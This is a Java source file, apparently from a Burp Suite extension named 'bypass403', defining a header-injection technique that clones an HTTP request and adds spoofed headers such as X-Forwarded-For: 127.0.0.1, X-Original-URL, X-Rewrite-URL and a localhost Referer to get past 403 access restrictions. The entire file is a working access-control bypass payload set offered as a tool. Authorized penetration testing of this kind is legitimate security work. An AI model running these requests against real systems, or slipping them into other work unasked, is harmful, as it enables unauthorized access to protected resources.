package bypass403.techniques;

import burp.api.montoya.http.message.requests.HttpRequest;
import java.util.ArrayList; import java.util.List;

public class HeaderInjectionTechnique implements BypassTechnique {
    public String getName(){ return "Header injection"; }
    public List<HttpRequest> generateCandidates(HttpRequest original){
        String path=original.path();
        String[][] headers={
            {"X-Forwarded-For","127.0.0.1"},{"X-Forwarded-For","localhost"},{"X-Forwarded-For","192.168.1.1"},
            {"X-Forwarded-Host","localhost"},{"X-Forwarded-Host","127.0.0.1"},
            {"X-Original-URL",path},{"X-Rewrite-URL",path},{"X-Custom-IP-Authorization","127.0.0.1"},
            {"X-Originating-IP","127.0.0.1"},{"X-Remote-IP","127.0.0.1"},{"X-Remote-Addr","127.0.0.1"},
            {"X-Client-IP","127.0.0.1"},{"X-Host","127.0.0.1"},{"Forwarded","for=127.0.0.1"},
            {"Referer","https://localhost"+path},{"X-Forwarded-Port","443"},{"X-Forwarded-Scheme","https"},
            {"X-Forwarded-for","127.0.0.1"},{"x-forwarded-for","127.0.0.1"}
        };
        ArrayList<HttpRequest> out=new ArrayList<>();
        for(String[] h:headers) out.add(original.withAddedHeader(h[0],h[1]).withMethod(original.method()));
        return out;
    }
}
